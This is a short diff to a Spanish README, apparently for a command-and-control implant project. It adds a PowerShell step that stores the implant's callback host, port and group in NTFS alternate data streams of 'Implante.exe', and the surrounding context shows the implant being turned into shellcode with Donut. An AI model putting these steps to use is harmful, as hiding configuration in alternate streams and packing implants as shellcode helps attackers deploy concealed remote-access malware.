@@ -9,6 +9,10 @@ dotnet add package Costura.Fody --version 5.7.0
 
 Compilar
 
+## Establecer host puerto y grupo
+```powershell
+Set-Content -Path ".\Implante.exe:Route" -Value "127.0.0.1"; Set-Content -Path ".\Implante.exe:Port" -Value "4000"; Set-Content -Path ".\Implante.exe:Group" -Value "Grupo"
+```
 Donut
 ```
 .\donut.exe -a 2 -f 1 -i Implante.exe -o loader.bin
